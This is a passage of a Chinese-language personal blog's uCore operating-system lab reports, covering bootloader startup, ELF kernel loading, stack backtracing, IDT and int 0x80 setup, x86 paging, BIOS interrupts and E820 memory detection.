bootmain</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Bootload 的启动过程可以概括如下：</p>
<p>首先，BIOS 将第一块扇区（存着 bootloader）读到内存中物理地址为 0x7c00 的位置，同时段寄存器 CS 值为 0x0000，IP 值为 0x7c00，之后开始执行 bootloader 程序。CLI 屏蔽中断（屏蔽所有的中断：为中断提供服务通常是操作系统设备驱动程序的责任，因此在 bootloader 的执行全过程中可以不必响应任何中断，中断屏蔽是通过写 CPU 提供的中断屏蔽寄存器来完成的）；CLD 使 DF 复位，即 DF=0，通过执行 cld 指令可以控制方向标志 DF，决定内存地址是增大（DF=0，向高地址增加）还是减小（DF=1，向地地址减小）。设置寄存器 ax，ds，es，ss 寄存器值为 0；A20 门被关闭，高于 1MB 的地址都默认回卷到 0，所以要激活 A20，给 8042 发命令激活 A20，8042 有两个 IO 端口：0x60 和 0x64， 激活流程： 发送 0xd1 命令到 0x64 端口 –&gt; 发送 0xdf 到 0x60，打开 A20 门。从实模式转换到保护模式（实模式将整个物理内存看成一块区域，程序代码和数据位于不同区域，操作系统和用户程序并没有区别对待，而且每一个指针都是指向实际的物理地址，地址就是 IP 值。这样，用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的），所以就初始化全局描述符表使得虚拟地址和物理地址匹配可以相互转换；lgdt 汇编指令把通过 gdt 处理后的（asm.h 头文件中处理函数）描述符表的起始位置和大小存入 gdtr 寄存器中；将 CR0 的第 0 号位设置为 1，进入保护模式；指令跳转由代码段跳到 protcseg 的起始位置。设置保护模式下数据段寄存器；设置堆栈寄存器并调用 bootmain 函数</p>
<h2 id="分析-bootloader-加载-ELF-格式的-OS-的过程"><a href="#分析-bootloader-加载-ELF-格式的-OS-的过程" class="headerlink" title="分析 bootloader 加载 ELF 格式的 OS 的过程"></a>分析 bootloader 加载 ELF 格式的 OS 的过程</h2><p>通过执行<code>readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0)</code>将 os 代码的 ELF 头读到内存中来。SECTSIZE=512 是扇区大小，ELFHDR 是存储 ELF 头格式的 OS 的地址。从磁盘 0 地址处（里面不算启动扇区，实际上是从第 1 个扇区开始读）读 SECTSIZE * 8 （8 个扇区） 读到 ELFHDR 这个地址上。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> end_va = va + count; <span class="comment">//终止地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//要读只能一个扇区一起读，将地址va与扇区开始处对齐，这样如果从对齐（减小过的va开始读取）的话，读完后没减过的实际传入没修改过的va就是我们想要的中间内容（注意va是传值调用进来的）</span></span><br><span class="line">    va -= offset % SECTSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>; <span class="comment">//算一算从哪个扇区开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno++)</span><br><span class="line">    &#123;</span><br><span class="line">        readsect((<span class="keyword">void</span> *)va, secno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一个扇区读取的代码<code>dst</code>指示该扇区要读到的内存地址，<code>secno</code>指示读取磁盘的哪一个扇区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>); <span class="comment">// 读几个扇区</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);  <span class="comment">//以下几个寄存器放扇区编号</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>); <span class="comment">// 操作内容，要求读扇区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取硬盘扇区的步骤：</p>
<ol>
<li><p>等待硬盘空闲。waitdisk 的函数实现只有一行：while ((inb(0x1F7) &amp; 0xC0) != 0x40)，意思是不断查询读 0x1F7 寄存器的最高两位，直到最高位为 0、次高位为 1（这个状态应该意味着磁盘空闲）才返回。</p>
</li>
<li><p>硬盘空闲后，发出读取扇区的命令。对应的命令字为 0x20，放在 0x1F7 寄存器中；读取的扇区数为 1，放在 0x1F2 寄存器中；读取的扇区起始编号共 28 位，分成 4 部分依次放在 0x1F3~0x1F6 寄存器中。</p>
</li>
<li><p>发出命令后，再次等待硬盘空闲。</p>
</li>
<li><p>硬盘再次空闲后，开始从 0x1F0 寄存器中读数据。注意 insl 的作用是”That function will read cnt dwords from the input port specified by port into the supplied output array addr.”，是以 dword 即 4 字节为单位的，因此这里 SECTIZE 需要除以 4.</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">insl(<span class="keyword">uint32_t</span> port, <span class="keyword">void</span> *addr, <span class="keyword">int</span> cnt) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">&quot;cld;&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">&quot;repne; insl;&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="string">&quot;=D&quot;</span> (addr), <span class="string">&quot;=c&quot;</span> (cnt)</span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="string">&quot;d&quot;</span> (port), <span class="string">&quot;0&quot;</span> (addr), <span class="string">&quot;1&quot;</span> (cnt)</span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;cc&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取完 8 个扇区的操作系统后开始解析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// is this a valid ELF?</span></span><br><span class="line"><span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//elf文件中的program header table</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// phoff: program header 表的起始位置偏移</span></span><br><span class="line">ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line"></span><br><span class="line"><span class="comment">// phnum: program header 表中的入口数目</span></span><br><span class="line"><span class="comment">// program header 表是一个program header结构的数组， 每个结构描述了一个段或者系统准备程序执行所必需的其它信息</span></span><br><span class="line"><span class="comment">// eph 就是该表的终止位置</span></span><br><span class="line">eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//p_va virtual address to map segment</span></span><br><span class="line">    <span class="comment">//p_memsz size of segment in memory (bigger if contains bss）</span></span><br><span class="line">    <span class="comment">//p_offset file offset of segment由于开始的地址是0，该偏移就是在磁盘中的实际地址</span></span><br><span class="line">    readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// call the entry point from the ELF header</span></span><br><span class="line"><span class="comment">// note: does not return</span></span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br></pre></td></tr></table></figure>
<p>用工具读 kern 可以看到地址前面两位为空<code>&amp; 0xFFFFFF</code>的作用就是截取后面的 24 位地址，还有注意<code>ELFHDR-&gt;e_entry</code>的值为<code>0x100000</code>，<code>ELFHDR</code>的地址是<code>0x10000</code>,少一个 0，不是一个地址。</p>
<p><img src="https://md.lagrange.plus/uploads/upload_9f1f9e574d09eab7da5d82fd3636b561.png" alt="kern"></p>
<h2 id="实现函数调用堆栈跟踪函数"><a href="#实现函数调用堆栈跟踪函数" class="headerlink" title="实现函数调用堆栈跟踪函数"></a>实现函数调用堆栈跟踪函数</h2><p>几乎所有本地编译器都会在每个函数体之前插入类似如下的汇编指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushl   %ebp</span><br><span class="line">movl   %esp , %ebp</span><br></pre></td></tr></table></figure>

<p>这样在程序执行到一个函数的实际指令前，已经有以下数据顺序入栈：参数、返回地址、ebp 寄存器。由此得到类似如下的栈结构（参数入栈顺序跟调用方式有关，这里以 C 语言默认的 CDECL 为例）：</p>
<p><img src="https://md.lagrange.plus/uploads/upload_11fd42ee568230926dd27f08d50957e6.png" alt="stack"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">print_stackframe(<span class="keyword">void</span>) &#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class="line">     <span class="comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class="line"><span class="comment">      *    (3.1) printf value of ebp, eip</span></span><br><span class="line"><span class="comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (uint32_t)ebp +2 [0..4]</span></span><br><span class="line"><span class="comment">      *    (3.3) cprintf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class="line"><span class="comment">      *    (3.5) popup a calling stackframe</span></span><br><span class="line"><span class="comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class="line"><span class="comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp(), eip = read_eip();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="comment">//#define STACKFRAME_DEPTH 20</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ebp != <span class="number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i ++) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);</span><br><span class="line">        <span class="keyword">uint32_t</span> *args = (<span class="keyword">uint32_t</span> *)ebp + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j ++) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;0x%08x &quot;</span>, args[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">        eip = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">1</span>];</span><br><span class="line">        ebp = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先定义两个局部变量 ebp、esp 分别存放 ebp、esp 寄存器的值。这里将 ebp 定义为指针，是为了方便后面取 ebp 寄存器的值。</p>
<p>调用 read_ebp 函数来获取执行 print_stackframe 函数时 ebp 寄存器的值，这里 read_ebp 必须定义为 inline 函数，否则获取的是执行 read_ebp 函数时的 ebp 寄存器的值。</p>
<p>调用 read_eip 函数来获取当前指令的位置，也就是此时 eip 寄存器的值。这里 read_eip 必须定义为常规函数而不是 inline 函数，因为这样的话在调用 read_eip 时会把当前 ebp 压栈，把 ebp 设置为 eip，故只要读调用函数后的 ebp 就可得到当前 eip 的值。</p>
<p>由于变量 eip 存放的是下一条指令的地址，因此将变量 eip 的值减去 1，得到的指令地址就属于当前指令的范围了。由于只要输入的地址属于当前指令的起始和结束位置之间，print_debuginfo 都能搜索到当前指令，因此这里减去 1 即可。</p>
<p>以后变量 eip 的值就不能再调用 read_eip 来获取了（每次调用获取的值都是相同的），而应该从 ebp 寄存器指向栈中的位置再往上一个单位中获取。这个地址指向上一个栈帧的最后入栈的元素。</p>
<p>由于 ebp 寄存器指向栈中的位置存放的是调用者的 ebp 寄存器的值，把现在的地址更新为这个地址里面存储的内容，据此可以继续顺藤摸瓜，不断回溯，直到 ebp 寄存器的值变为 0</p>
<h2 id="int-0x80系统调用实现"><a href="#int-0x80系统调用实现" class="headerlink" title="int 0x80系统调用实现"></a><code>int 0x80</code>系统调用实现</h2><p>CS 作为段基址寄存器储存着段选择子，里面包含 GDT 表的偏移以及当前的特权级 CPL。对于用户态程序来说 CPL 一般为 3，内核段的 DPL 都是 0，无法直接访问内核的数据与代码，若需要访问则需要通过中断实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(struct gatedesc); i ++) &#123;</span><br><span class="line">    SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// set for switch from user to kernel</span></span><br><span class="line">SETGATE(idt[T_SWITCH_TOK], <span class="number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br></pre></td></tr></table></figure>
<p>在设置中断向量表 IDT 的时候，故意将<code>T_SWITCH_TOK=0x79</code>(实际是第 0x80 项)的 DPL 设置为用户态权限 3，其余都设置为内核态 0.<br><img src="https://md.lagrange.plus/uploads/upload_85d13f38c3c4636e196ba2a53b33436f.png" alt="IDT"></p>
<p>每个 IDT 表项如上图所示，当一个程序引发 0x80 中断时，CPU 通过硬件检查 IDT 中对应的 DPL 特权级，发现为 3 可以访问，然后将对应的段选择符和入口偏移装入 CS：IP，该段选择符的 CPL 为 0，即进入内核，可以通过系统调用操作一些内存数据。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab2/" class="post-title-link" itemprop="url">Lab2 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:27:13" itemprop="dateModified" datetime="2021-04-23T00:27:13Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h1><h2 id="X86-页表结构"><a href="#X86-页表结构" class="headerlink" title="X86 页表结构"></a>X86 页表结构</h2><p>分页转换功能由驻留在内存中的表来描述，该表称为页表（page table），存放在物理地址空间中。线性地址的高 20 位构成页表数组的索引值，用于选择对应页面的物理（基）地址。线性地址的低 12 位给出了页面中的偏移量，加上页面的基地址最终形成对应的物理地址。由于页面基地址对齐在 4K ($2^{12}$) 边界上，因此页面基地址的低 12 位肯定是 0。这意味着高 20 位的页面基地址和 12 位偏移量连接组合在一起就能得到对应的物理地址。</p>
<p>页表中每个页表项的大小为 32 位。由于只需要其中的 20 位来存放页面的物理基地址，因此剩下的 12 位可用于存放诸如页面是否存在等的属性信息。如果线性地址索引的页表项被标注为存在的，则表示该项有效，我们可以从中取得页面的物理地址。如果页表项中信息表明（说明、指明）页不存在，那么当访问对应物理页面时就会产生一个异常。</p>
<h3 id="两级页表结构"><a href="#两级页表结构" class="headerlink" title="两级页表结构"></a>两级页表结构</h3><p>页表含有 $2^{20}$（1M）个表项，而每项占用 4 Byte。如果作为一个表来存放的话，它们最多将占用 4MB 的内存。因此为了减少内存占用量，x86 使用了两级表。由此，高 20 位线性地址到物理地址的转换也被分成两步来进行，每步使用（转换）其中的 10bit。</p>
<ol>
<li>第一级表称为页目录（page directory）。它被存放在 1 页 4K 页面中，具有 $2^{10}$（1K）个 4B 长度的表项。这些表项指向对应的二级表。线性地址的最高 10 位（位 31 ～ 22）用作一级表（页目录）中的索引值来选择 $2^{10}$ 个二级表之一。</li>
<li>第二级表称为页表（page table），它的长度也是 1 个页面，最多含有 1K 个 4B 的表项。每个 4B 表项含有相关页面的 20 位物理基地址。二级页表使用线性地址中间 10 位（位 21 ～ 12）作为表项索引值，以获取含有页面 20 位物理基地址的表项。该 20 位页面物理基地址和线性地址中的低 12 位（页内偏移）组合在一起就得到了分页转换过程的输出值，即对应的最终物理地址。</li>
</ol>
<p>CR3 寄存器指定页目录表的基地址。线性地址的高 10 位用于索引这个页目录表，以获得指向相关第二级页表的指针。线性地址中间 10 位用于索引二级页表，以获得物理地址的高 20 位。线性地址的低 12 位直接作为物理地址低 12 位，从而组成一个完整的 32 位物理地址。</p>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><h3 id="中断向量表和中断描述符表的区别"><a href="#中断向量表和中断描述符表的区别" class="headerlink" title="中断向量表和中断描述符表的区别"></a>中断向量表和中断描述符表的区别</h3><p>中断向量表是在实模式下使用，每个中断向量由 4 字节组成。这 4 字节指明了一个中断服务程序的段值和段内偏移值（实模式每个寄存器 16 位，基址和偏移刚好 4 字节）。当 x86 电脑上电时，BIOS 中的程序会在物理内存开始地址 0x0000:0x0000 （基址：偏移 其实就是 0 地址处）处初始化并设置中断向量表，而各中断的默认中断服务程序则在 BIOS 中给出。由于中断向量表中的向量是按中断号顺序排列，因此给定一个中断号 N，那么它对应的中断向量在内存中的位置就是 0x0000:N*4，即对应的中断服务程序入口地址保存在物理内存 0x0000:N*4 位置处。</p>
<p>在 BIOS 执行初始化操作时，它设置了两个 8259A 芯片支持的 16 个硬件中断向量和 BIOS 提供的中断号为 0x10 ～ 0x1f 的中断调用功能向量等。对于实际没有使用的向量则填入临时的哑中断服务程序的地址。以后在系统引导加载操作系统时会根据实际需要修改某些中断向量的值。例如，对于 DOS 操作系统，它会重新设置中断 0x20 ～ 0x2f 的中断向量值。而对于 Linux 系统，除了在刚开始加载内核时需要用到 BIOS 提供的显示和磁盘读操作中断功能，在内核正常运行之前则会在 setup.s 程序中重新初始化 8259A 芯片并且在 head.s 程序中重新设置一张<strong>中断描述符表</strong>。完全抛弃了 BIOS 所提供的中断服务功能。(因为 DOS 运行在实模式下，直接在原来的表上改就行了，但是 Linux 运行在保护模式下，必须使用保护模式下的<strong>中断描述符表</strong>)</p>
<p>当 Intel CPU 运行在 32 位保护模式下时，需要使用中断描述符表来管理中断或异常。其作用也类似于中断向量表，只是其中每个中断描述符项中除了含有中断服务程序地址以外，还包含有关特权级和描述符类别等信息（中断向量表里只有地址）。</p>
<h3 id="BIOS-中断处理"><a href="#BIOS-中断处理" class="headerlink" title="BIOS 中断处理"></a>BIOS 中断处理</h3><h4 id="BIOS-为什么添加中断处理例程呢？"><a href="#BIOS-为什么添加中断处理例程呢？" class="headerlink" title="BIOS 为什么添加中断处理例程呢？"></a>BIOS 为什么添加中断处理例程呢？</h4><ol>
<li><p>给自己用，因为 BIOS 也是一段程序，是程序就很可能要重复性地执行某段代码，它直接将其写成中断函数，直接调用多省心。</p>
</li>
<li><p>给后来的程序用，如加载器或 boot loader。它们在调用硬件资源时就不需要自己重写代码了。</p>
</li>
</ol>
<h4 id="BIOS-是如何设置中断处理程序的呢？"><a href="#BIOS-是如何设置中断处理程序的呢？" class="headerlink" title="BIOS 是如何设置中断处理程序的呢？"></a>BIOS 是如何设置中断处理程序的呢？</h4><p>通过 BIOS 也要调用别人的函数例程，硬件厂商为了让自己生产的产品易用，肯定事先写好了一组调用接口，必然是越简单越好，直接给接口函数传一个参数，硬件就能返回一个输出。</p>
<p>那这些硬件自己的接口代码在哪里呢？</p>
<p>每个外设，包括显卡、键盘、各种控制器等，都有自己的内存（主板也有自己的内存，BIOS 就存放在里面），不过这种内存都是只读存储器 ROM。硬件自己的功能调用例程及初始化代码就存放在这 ROM 中。根据规范，第 1 个内存单元的内容是 0x55，第 2 个存储单元是 0xAA，第 3 个存储单位是该 rom 中以 512 字节为单位的代码长度。从第 4 个存储单元起就是实际代码了，直到第 3 个存储单元所示的长度为止。</p>
<h4 id="CPU-如何访问到外设的-ROM-呢？"><a href="#CPU-如何访问到外设的-ROM-呢？" class="headerlink" title="CPU 如何访问到外设的 ROM 呢？"></a>CPU 如何访问到外设的 ROM 呢？</h4><p>访问外设有两种方式。</p>
<p>（1）内存映射：通过地址总线将外设自己的内存映射到某个内存区域（并不是映射到主板上插的内存条中）。</p>
<p>（2）端口操作：外设都有自己的控制器，控制器上有寄存器，这些寄存器就是所谓的端口，通过 in/out 指令读写端口来访问硬件的内存。</p>
<p>从内存的物理地址 0xA0000 开始到 0xFFFFF 这部分内存中，一部分是专门用来做映射的，如果硬件存在，硬件自己的 ROM 会被映射到这片内存中的某处。</p>
<h4 id="BIOS-中断处理-1"><a href="#BIOS-中断处理-1" class="headerlink" title="BIOS 中断处理"></a>BIOS 中断处理</h4><p>BIOS 在运行期间会扫描 0xC0000 到 0xE0000 之间的内存，若在某个区域发现前两个字节是 0x55 和 0xAA 时，这意味着该区域对应的 rom 中有代码存在，再对该区域做累加和检查，若结果与第 3 个字节的值相符，说明代码无误，就从第 4 个字节进入。这时开始执行了硬件自带的例程以初始化硬件自身，最后，BIOS 填写中断向量表中相关项，使它们指向硬件自带的例程。</p>
<p>DOS 是运行在实模式下的，故其建立的中断调用也建立在中断向量表中，只不过其中断向量号和 BIOS 的不能冲突。</p>
<p>0x20 ～ 0x27 是 DOS 中断。因为 DOS 在实模式下运行，故其可以调用 BIOS 中断。</p>
<p>DOS 中断只占用 0x21 这个中断号，也就是 DOS 只有这一个中断例程。</p>
<p>DOS 中断调用中那么多功能是如何实现的？是通过先往 ah 寄存器中写好子功能号，再执行 int 0x21。这时在中断向量表中第 0x21 个表项，即物理地址 0x21*4 处中的中断处理程序开始根据寄存器 ah 中的值来调用相应的子功能。</p>
<p>而 Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表已经不存在了，取而代之的是中断描述符表。</p>
<p>Linux 的系统调用和 DOS 中断调用类似，不过 Linux 是通过 int 0x80 指令进入一个中断程序后再根据 eax 寄存器的值来调用不同的子功能函数的。再补充一句：如果在实模式下执行 int 指令，会自动去访问中断向量表。如果在保护模式下执行 int 指令，则会自动访问中断描述符表。</p>
<h2 id="uCore-系统内存的探测"><a href="#uCore-系统内存的探测" class="headerlink" title="uCore 系统内存的探测"></a>uCore 系统内存的探测</h2><h3 id="INT-15h-中断与-E820-参数"><a href="#INT-15h-中断与-E820-参数" class="headerlink" title="INT 15h 中断与 E820 参数"></a>INT 15h 中断与 E820 参数</h3><p>在我们分配物理内存空间前，我们必须要获取物理内存空间的信息 - 比如哪些地址空间可以使用，哪些地址空间不能使用等。在本实验中， 我们通过向 INT 15h 中断传入 e820h 参数来探测物理内存空间的信息(除了这种方法外，我们还可以使用其他的方法)。</p>
<p>下面我们来看一下 uCore 中物理内存空间的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">e820map:</span><br><span class="line">  memory: 0009fc00, [00000000, 0009fbff], type &#x3D; 1.</span><br><span class="line">  memory: 00000400, [0009fc00, 0009ffff], type &#x3D; 2.</span><br><span class="line">  memory: 00010000, [000f0000, 000fffff], type &#x3D; 2.</span><br><span class="line">  memory: 07ee0000, [00100000, 07fdffff], type &#x3D; 1.</span><br><span class="line">  memory: 00020000, [07fe0000, 07ffffff], type &#x3D; 2.</span><br><span class="line">  memory: 00040000, [fffc0000, ffffffff], type &#x3D; 2.</span><br></pre></td></tr></table></figure>
<p>这里的 type 是物理内存空间的类型，1 是可以使用的物理内存空间， 2 是不能使用的物理内存空间。注意， 2 中的”不能使用”指的是这些地址不能映射到物理内存上， 但它们可以映射到 ROM 或者映射到其他设备，比如各种外设等。</p>
